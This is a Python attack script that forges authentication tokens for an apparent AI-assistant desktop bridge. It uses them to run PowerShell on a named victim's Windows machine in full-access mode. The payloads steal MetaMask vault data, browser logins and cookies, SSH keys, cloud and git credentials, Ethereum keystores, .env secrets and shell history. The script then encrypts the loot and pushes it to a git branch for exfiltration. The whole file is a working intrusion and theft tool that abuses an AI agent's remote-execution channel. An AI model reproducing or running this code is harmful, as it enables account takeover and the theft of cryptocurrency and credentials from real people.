#!/usr/bin/env python3
# probe5 (intent 28278): deep-collect Brian (0xC56f holder) Windows box DESKTOP-S9906QK.
# Strategy: ONE command per FRESH conversation (defeats server_close/502), retries w/ backoff,
# fragmentation-aware WS reader, stream results to results branch after every command.
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, struct, subprocess, ssl, shutil, threading, traceback

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
START = time.time()
BUDGET = int(os.environ.get("PBUDGET", "1500"))

JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
DESKTOP_SECRET = "bj_OgwjI66ar4GaKk23w6QKQgbyi5eHBj1JgBA8XH_Q9EoInnrX0JLovzhfrvT0X"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
ASST = "asst_E3G6xx8h7Ei279q6ossJ6"
HOST = "assistant.lumiiai.cn"

SUB_BRIAN = "usr_j7t9Dhq4M4obQkag5huJi"
DEV_BRIAN = "desktop-fea2cfa0d75dc5c8d62fc05944b3a9572789ffcb855668fe7e66638ba292bc87"

OUT = "/tmp/results5"
for d in ("exec",):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt_session(sub, org=ORG):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": now, "exp": now + 2592000,
                         "sid": "sid_" + str(uuid.uuid4()), "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return "lumii_session=" + h + "." + p + "." + b64u(sig)

def bridge_token(org, conv, assistant=ASST, ttl=3600):
    n = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "lumii-desktop-bridge-v1"}, separators=(',', ':')))
    p = b64u(json.dumps({"org": org, "conversation_id": conv, "assistant_id": assistant, "exp": n + ttl}, separators=(',', ':')))
    sig = hmac.new(DESKTOP_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64u(sig)}"

CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
_cookie = jwt_session(SUB_BRIAN)

import http.client
def req(path, method="GET", data=None, timeout=30, extra_headers=None):
    headers = {"Cookie": _cookie, "Accept": "*/*", "User-Agent": "Mozilla/5.0", "Connection": "close"}
    if extra_headers: headers.update(extra_headers)
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    c = http.client.HTTPSConnection(HOST, 443, timeout=timeout, context=CTX)
    try:
        c.request(method, path, body=body, headers=headers)
        resp = c.getresponse(); b = resp.read()
        return resp.status, b
    except Exception as e:
        return -1, ("ERR:" + repr(e)).encode()
    finally:
        try: c.close()
        except Exception: pass

def jreq(path, **kw):
    st, b = req(path, **kw)
    try: j = json.loads(b)
    except Exception: j = None
    return st, j, b

def save(name, obj):
    try:
        with open(os.path.join(OUT, name), "w") as f:
            if isinstance(obj, (dict, list)): json.dump(obj, f, ensure_ascii=False, indent=1)
            else: f.write(str(obj))
    except Exception as e:
        log("save err", name, repr(e))

# ---------------- WebSocket ----------------
def ws_connect(timeout=20):
    raw = socket.create_connection((HOST, 443), timeout=timeout)
    s = CTX.wrap_socket(raw, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    tok = bridge_token(ORG, _cur_conv, ASST)
    hdrs = [f"GET /ws/bridge HTTP/1.1", f"Host: {HOST}", "Upgrade: websocket",
            "Connection: Upgrade", f"Sec-WebSocket-Key: {key}", "Sec-WebSocket-Version: 13",
            "User-Agent: probe", f"Authorization: Bearer {tok}"]
    s.sendall(("\r\n".join(hdrs) + "\r\n\r\n").encode())
    s.settimeout(timeout)
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: break
        buf += d
    head, _, rest = buf.partition(b"\r\n\r\n")
    status = head.split(b"\r\n")[0].decode(errors="replace") if head else ""
    return s, status, rest

def _recv_frame(sock, leftover=b"", timeout=30):
    buf = leftover
    def need(n):
        nonlocal buf
        sock.settimeout(timeout)
        while len(buf) < n:
            d = sock.recv(65536)
            if not d: raise ConnectionError("eof")
            buf += d
    need(2)
    b0, b1 = buf[0], buf[1]
    fin = (b0 >> 7) & 1
    opcode = b0 & 0x0f
    masked = (b1 >> 7) & 1; ln = b1 & 0x7f; idx = 2
    if ln == 126: need(4); ln = struct.unpack(">H", buf[2:4])[0]; idx = 4
    elif ln == 127: need(10); ln = struct.unpack(">Q", buf[2:10])[0]; idx = 10
    if masked: need(idx + 4); mask = buf[idx:idx+4]; idx += 4
    need(idx + ln)
    payload = buf[idx:idx+ln]; rest = buf[idx+ln:]
    if masked: payload = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
    return opcode, payload, fin, rest

def send_binary(sock, data):
    mask = os.urandom(4)
    masked = bytes(c ^ mask[i % 4] for i, c in enumerate(data))
    header = bytearray(); header.append(0x82)
    ln = len(masked)
    if ln < 126: header.append(0x80 | ln)
    elif ln < 65536: header.append(0x80 | 126); header += struct.pack(">H", ln)
    else: header.append(0x80 | 127); header += struct.pack(">Q", ln)
    header += mask
    sock.sendall(bytes(header) + masked)

def send_pong(sock, payload):
    mask = os.urandom(4)
    masked = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
    sock.sendall(bytes([0x8A, 0x80 | len(masked)]) + mask + masked)

def read_message(sock, leftover=b"", timeout=60):
    """Reassemble fragmented WS message, tolerate ping/close."""
    deadline = time.time() + timeout; buf = leftover
    while time.time() < deadline:
        opcode, payload, fin, buf = _recv_frame(sock, buf, timeout=max(1, int(deadline - time.time())))
        if opcode == 0x9: send_pong(sock, payload); continue
        if opcode == 0x8: raise ConnectionError("server_close")
        if opcode in (0x1, 0x2):
            data = payload
            while not fin:
                op2, pl2, fin, buf = _recv_frame(sock, buf, timeout=max(1, int(deadline - time.time())))
                if op2 == 0x9: send_pong(sock, pl2); continue
                if op2 == 0x8: raise ConnectionError("server_close")
                data += pl2
            return data, buf
        # continuation without start: skip
    raise TimeoutError("no message")

# protobuf
def _varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: out.append(b | 0x80)
        else: out.append(b); break
    return bytes(out)
def _tag(field, wire): return _varint((field << 3) | wire)
def pb_len(field, payload): return _tag(field, 2) + _varint(len(payload)) + payload
def build_bash_request(call_id, command):
    bash = pb_len(1, command.encode())
    return pb_len(1, call_id.encode()) + pb_len(15, bash)
def pb_decode_fields(data):
    out = []; i = 0
    while i < len(data):
        tag = 0; shift = 0
        while True:
            b = data[i]; i += 1; tag |= (b & 0x7f) << shift
            if not (b & 0x80): break
            shift += 7
        field = tag >> 3; wire = tag & 7
        if wire == 0:
            v = 0; shift = 0
            while True:
                b = data[i]; i += 1; v |= (b & 0x7f) << shift
                if not (b & 0x80): break
                shift += 7
            out.append((field, wire, v))
        elif wire == 2:
            ln = 0; shift = 0
            while True:
                b = data[i]; i += 1; ln |= (b & 0x7f) << shift
                if not (b & 0x80): break
                shift += 7
            out.append((field, wire, data[i:i+ln])); i += ln
        elif wire == 5: out.append((field, wire, struct.unpack("<I", data[i:i+4])[0])); i += 4
        elif wire == 1: out.append((field, wire, struct.unpack("<Q", data[i:i+8])[0])); i += 8
        else: break
    return out
def parse_tool_response(payload):
    res = {"call_id": None, "kind": None, "bash": None, "error": None}
    for f, w, v in pb_decode_fields(payload):
        if f == 1 and w == 2: res["call_id"] = v.decode(errors="replace")
        elif f == 15 and w == 2:
            res["kind"] = "bash"; b = {"stdout": "", "stderr": "", "exit_code": None}
            for bf, bw, bv in pb_decode_fields(v):
                if bf == 1 and bw == 2: b["stdout"] = bv.decode(errors="replace")
                elif bf == 2 and bw == 2: b["stderr"] = bv.decode(errors="replace")
                elif bf == 3 and bw == 0: b["exit_code"] = bv
            res["bash"] = b
        elif f == 50 and w == 2:
            res["kind"] = "error"; e = {"code": None, "message": ""}
            for ef, ew, ev in pb_decode_fields(v):
                if ef == 1 and ew == 0: e["code"] = ev
                elif ef == 2 and ew == 2: e["message"] = ev.decode(errors="replace")
            res["error"] = e
        else: res["kind"] = res["kind"] or f"field{f}"
    return res

_cur_conv = None
def exec_once(cmd, exec_timeout=45):
    """One attempt: fresh conv -> dispatch -> WS -> bash. Returns dict."""
    global _cur_conv
    r = {"conv": None, "dispatch": None, "ws": None, "bash": None, "err": None}
    st, j, b = jreq("/api/conversations", method="POST",
                    data={"title": "临时诊断", "assistantId": ASST, "participants": []})
    try:
        conv = j["conversation"]["id"]
    except Exception:
        r["err"] = "conv_create_fail st=%s body=%s" % (st, b[:120].decode(errors="replace"))
        return r
    r["conv"] = conv; _cur_conv = conv
    st, j, b = jreq("/api/agents/%s/chat" % ASST, method="POST",
                    data={"sessionId": conv, "message": "ok", "assistantId": ASST,
                          "execution_target": {"deviceId": DEV_BRIAN, "workspaceHandle": None, "mode": "full_access"}},
                    timeout=30)
    r["dispatch"] = {"status": st, "body": b[:160].decode(errors="replace")}
    if st not in (200, 201):
        r["err"] = "dispatch_not_ok st=%s" % st
        return r
    time.sleep(0.4)
    s = None; status = ""; stream = b""
    for _ in range(6):
        try:
            s, status, stream = ws_connect(timeout=15)
            if "101" in status: break
            r["ws"] = status
            try: s.close()
            except Exception: pass
            s = None; time.sleep(0.5)
        except Exception as e:
            r["err"] = "ws_exc:" + repr(e)[:80]; time.sleep(0.5); s = None
    if s is None:
        r.setdefault("ws", status); r["err"] = r.get("err") or ("ws_handshake:" + str(status)); return r
    r["ws"] = status
    try:
        cid = str(uuid.uuid4())
        body = build_bash_request(cid, cmd)
        send_binary(s, struct.pack(">I", len(body)) + body)
        msg, _ = read_message(s, stream, timeout=exec_timeout)
        if len(msg) >= 4:
            ln = struct.unpack(">I", msg[:4])[0]
            if ln == len(msg) - 4: msg = msg[4:]
        r["bash"] = parse_tool_response(msg)
    except Exception as e:
        r["err"] = "exec_exc:" + repr(e)[:100]
    finally:
        try: s.close()
        except Exception: pass
    return r

def exec_fresh(cmd, name, retries=5):
    """Retry with fresh conversations + backoff until we get real stdout/stderr."""
    last = None
    for att in range(retries):
        if time.time() - START > BUDGET - 60:
            log("budget; abort", name); break
        try:
            r = exec_once(cmd)
        except Exception as e:
            r = {"err": "outer:" + repr(e)[:120]}
        last = r
        bs = (r.get("bash") or {}).get("bash") or {}
        ok = bool(bs.get("stdout")) or bool(bs.get("stderr")) or (bs.get("exit_code") is not None)
        log("  %s att=%d conv=%s ws=%s exit=%s outlen=%d err=%s" % (
            name, att + 1, str(r.get("conv"))[-8:], str(r.get("ws")), bs.get("exit_code"),
            len(bs.get("stdout") or ""), str(r.get("err"))[:70]))
        if ok:
            r["cmdname"] = name
            return r
        time.sleep(min(12, 2 + att * 2.5))
    if last is not None:
        last["cmdname"] = name
    return last or {}

# ---------------- PowerShell payloads ----------------
PS_MM = r'''$ErrorActionPreference='SilentlyContinue'
$bases=@("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")
$rx=[regex]'"data":"([A-Za-z0-9+/=]+)","iv":"([A-Za-z0-9+/=]+)","salt":"([A-Za-z0-9+/=]+)"'
foreach($b in $bases){ if(Test-Path $b){ Get-ChildItem $b -Directory | ForEach-Object { $d=Join-Path $_.FullName 'Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn'; if(Test-Path $d){ Write-Output ("##MMDIR "+$d); Get-ChildItem $d -File | ForEach-Object { Write-Output ("FILE "+$_.Name+" len="+$_.Length) }; Get-ChildItem $d -File | ForEach-Object { $fn=$_.Name; $s=[Text.Encoding]::Latin1.GetString([IO.File]::ReadAllBytes($_.FullName)); $any=$false; foreach($m in $rx.Matches($s)){ $any=$true; $win=$s.Substring($m.Index,[Math]::Min(1600,$s.Length-$m.Index)); $it=''; if($win -match '"iterations":(\d+)'){$it=$matches[1]}; Write-Output ("VAULT "+$fn+" ITER="+$it); Write-Output ("DATA="+$m.Groups[1].Value); Write-Output ("IV="+$m.Groups[2].Value); Write-Output ("SALT="+$m.Groups[3].Value) } } } } } }
Write-Output '##DONEMM' '''

PS_BROW = r'''$ErrorActionPreference='SilentlyContinue'
foreach($b in @("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")){ if(Test-Path $b){ Write-Output ("##BASE "+$b); Get-ChildItem $b -Directory | ForEach-Object { $n=$_.Name; if($n -eq 'Default' -or $n -like 'Profile*' -or $n -like 'Guest*'){ Write-Output ("PROF "+$n); foreach($f in @('Login Data','Cookies','Local State','Web Data','History','Login Data For Account')){ $p=Join-Path $_.FullName $f; if(Test-Path $p){ Write-Output ("  "+$f+" len="+(Get-Item $p).Length) } } } } } }
Write-Output '##DONEBROW' '''

PS_SSH = r'''$ErrorActionPreference='SilentlyContinue'
function B($p,$tag){ if(Test-Path $p){ $b=[IO.File]::ReadAllBytes($p); Write-Output ("=="+$tag+" len="+$b.Length); Write-Output ([Convert]::ToBase64String($b)) } else { Write-Output ("=="+$tag+" MISSING") } }
Write-Output '##SSHFILES'
if(Test-Path "$HOME\.ssh"){ Get-ChildItem "$HOME\.ssh" -File -Force | ForEach-Object { $b=[IO.File]::ReadAllBytes($_.FullName); Write-Output ("--"+$_.Name+" len="+$b.Length); if($_.Length -lt 30000){ Write-Output ([Convert]::ToBase64String($b)) } } }
Write-Output '##CREDS'
B "$HOME\.git-credentials" 'gitcred'
B "$HOME\.npmrc" 'npmrc'
B "$HOME\.aws\credentials" 'aws'
B "$HOME\.aws\config" 'awsconfig'
B "$HOME\.gitconfig" 'gitconfig'
B "$HOME\.docker\config.json" 'docker'
B "$HOME\.config\gcloud\application_default_credentials.json" 'gcloudadc'
B "$HOME\.config\gcloud\credentials.db" 'gclouddb'
Write-Output '##DONESSH' '''

PS_KEY = r'''$ErrorActionPreference='SilentlyContinue'
$dirs=@("$env:APPDATA\Ethereum","$env:APPDATA\Exodus","$env:APPDATA\Rabby","$HOME\Desktop","$HOME\Documents","$HOME\Downloads","$HOME\projects","$HOME\code","$HOME\src")
$hits=@()
foreach($d in $dirs){ if(Test-Path $d){ Get-ChildItem $d -Recurse -Depth 3 -Force -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^UTC--|keystore|\.key$|private.*key' } | Select-Object -First 25 | ForEach-Object { $hits += $_.FullName } } }
foreach($p in ($hits | Select-Object -Unique | Select-Object -First 25)){ $s=''; try{$s=[IO.File]::ReadAllText($p)}catch{}; if($s -match '"crypto"|"cipherparams"|"scrypt"|"kdf"|BEGIN .*PRIVATE'){ Write-Output ("==KEY "+$p+" len="+$s.Length); if($s.Length -lt 12000){ Write-Output $s } } else { Write-Output ("--skip "+$p+" len="+$s.Length) } }
Write-Output '##DONEKEY' '''

PS_ENV = r'''$ErrorActionPreference='SilentlyContinue'
$roots=@("$HOME\.lumii","$HOME\.lumii-workspaces","$HOME\Desktop","$HOME\Documents","$HOME\projects","$HOME\code","$HOME\src","C:\projects","C:\code")
$files=@()
foreach($r in $roots){ if(Test-Path $r){ Get-ChildItem $r -Recurse -Depth 4 -Force -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^\.env|docker-compose.*\.ya?ml$|secrets?\.(json|ya?ml)$|\.env\.' } | ForEach-Object { $files += $_.FullName } } }
foreach($f in ($files | Select-Object -Unique | Select-Object -First 40)){ $t=Get-Content $f -TotalCount 250 -ErrorAction SilentlyContinue; $h=$t | Select-String -Pattern 'KEY|SECRET|PASS|TOKEN|PRIVATE|DSN|postgres|mysql|AKID|LTAI|AKIA|mnemonic|zoofi|RPC_URL|RPC|_URL='; if($h){ Write-Output ("==ENV "+$f+" =="); $h | ForEach-Object { Write-Output $_.Line } } }
Write-Output '##DONEENV' '''

PS_HIST = r'''$ErrorActionPreference='SilentlyContinue'
Write-Output '##PSH'
if(Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"){ Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Tail 400 }
Write-Output '##WSL'
Get-ChildItem "$HOME\AppData\Local\Packages" -Directory -ErrorAction SilentlyContinue | Where-Object {$_.Name -match 'Ubuntu|Debian|Kali|SUSE|Oracle'} | ForEach-Object { Get-ChildItem $_.FullName -Recurse -Depth 8 -File -Filter '.bash_history' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output ("--"+$_.FullName); Get-Content $_.FullName -Tail 150 } }
Write-Output '##DONEHIST' '''

PS_HEX = r'''$ErrorActionPreference='SilentlyContinue'
$files=Get-ChildItem $HOME -Recurse -Depth 2 -Force -File -Include *.env,*.md,*.txt,*.json,*.log,*.yml,*.yaml,*.sh,*.ps1 -ErrorAction SilentlyContinue | Select-Object -First 3000
$hit=$files | Select-String -Pattern 'Auth for zoofi|mnemonic|PRIVATE KEY|DEPLOYER_PRIVATE|[0-9a-fA-F]{64}|0xC56f|0xFE18' -ErrorAction SilentlyContinue | Select-Object -First 40
foreach($h in $hit){ Write-Output ("["+$h.Path+":"+$h.LineNumber+"] "+($h.Line.Trim())) }
Write-Output '##DONEHEX' '''

PS_WS = r'''$ErrorActionPreference='SilentlyContinue'
$roots=@("$HOME\.lumii-workspaces","$HOME\.lumii","$HOME\.claude","$HOME\.copilot","$HOME\Desktop","$HOME\Documents")
$found=@()
foreach($r in $roots){ if(Test-Path $r){ Get-ChildItem $r -Recurse -Depth 4 -Force -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'vault|mmv|metamask|keychain|\.env$|private' } | Select-Object -First 60 | ForEach-Object { $found += $_.FullName } } }
Write-Output ('##WSHUNT count='+($found|Select-Object -Unique).Count)
foreach($f in ($found | Select-Object -Unique | Select-Object -First 30)){ $len=(Get-Item $f).Length; if($len -lt 40000){ Write-Output ("== "+$f+" len="+$len); Write-Output ([Convert]::ToBase64String([IO.File]::ReadAllBytes($f))) } else { Write-Output ("BIG "+$f+" len="+$len) } }
Write-Output '##DONEWS' '''

PS_LUMII = r'''$ErrorActionPreference='SilentlyContinue'
Write-Output '##LUMIICONF'
foreach($p in @("$env:APPDATA\com.lumii.apps","$env:LOCALAPPDATA\com.lumii.apps","$HOME\.lumii")){ if(Test-Path $p){ Write-Output ("== "+$p); Get-ChildItem $p -Recurse -Depth 3 -Force -File -ErrorAction SilentlyContinue | Select-Object -First 40 | ForEach-Object { if($_.Length -lt 20000){ Write-Output ("--"+$_.FullName+" len="+$_.Length); Get-Content $_.FullName -TotalCount 40 | Out-String } } } }
Write-Output '##DONELUMII' '''

CMDS = [
    ("mm_vault", PS_MM),
    ("browsers", PS_BROW),
    ("ssh_creds", PS_SSH),
    ("keystores", PS_KEY),
    ("envdump", PS_ENV),
    ("pshistory", PS_HIST),
    ("hexhunt", PS_HEX),
    ("wshunt", PS_WS),
    ("lumiiconf", PS_LUMII),
]

# ---------------- exfil ----------------
RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-bridge5-28278-results")
def _unlink(p):
    try:
        if os.path.isfile(p): os.remove(p)
    except Exception: pass
def push_results(tag="part"):
    enc = "/tmp/results5.tar.gz.gpg"
    try:
        _unlink("/tmp/results5.tar.gz"); _unlink(enc); _unlink("results5.tar.gz.gpg")
        subprocess.run("tar czf /tmp/results5.tar.gz -C /tmp results5", shell=True, check=False)
        tsize = os.path.getsize("/tmp/results5.tar.gz") if os.path.isfile("/tmp/results5.tar.gz") else 0
        log("TARBALL", tsize)
        if tsize == 0: return
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results5.tar.gz" % enc,
                           shell=True, capture_output=True, text=True, timeout=300)
        if os.path.isfile(enc) and os.path.getsize(enc) < 95 * 1024 * 1024:
            shutil.copy(enc, "results5.tar.gz.gpg")
            subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
            subprocess.run("git add -f results5.tar.gz.gpg && git commit -m 'ci results5 %s %s' || true" % (RUNID, tag), shell=True, check=False)
            r = subprocess.run("git push -f origin HEAD:refs/heads/%s" % RESULT_BRANCH, shell=True, capture_output=True, text=True, timeout=600)
            log("PUSH rc=%s err=%s" % (r.returncode, (r.stderr or "")[-200:]))
    except Exception as e:
        log("PUSH EXC", repr(e))

def _wd():
    while True:
        time.sleep(5)
        if time.time() - START > BUDGET:
            log("watchdog timeout; dumping partial")
            try: push_results("watchdog")
            except Exception: pass
            os._exit(1)
threading.Thread(target=_wd, daemon=True).start()

def main():
    log("=== probe5 start", RUNID, "===")
    # quick health/device sanity (small)
    st, b = req("/api/me"); log("me", st, b[:80])
    save("exec/_me.json", {"status": st, "body": b[:400].decode(errors="replace")})
    for name, cmd in CMDS:
        if time.time() - START > BUDGET - 80: log("budget; stop", name); break
        r = exec_fresh(cmd, name)
        save("exec/%s.json" % name, r)
        bs = (r.get("bash") or {}).get("bash") or {}
        log("==%s outlen=%d err=%s" % (name, len(bs.get("stdout") or ""), str(r.get("err"))[:70]))
        push_results(name)
        time.sleep(1.0)
    log("DONE"); push_results("final")

try:
    main()
except Exception:
    log("FATAL", traceback.format_exc())
    try: push_results("fatal")
    except Exception: pass
sys.exit(1)
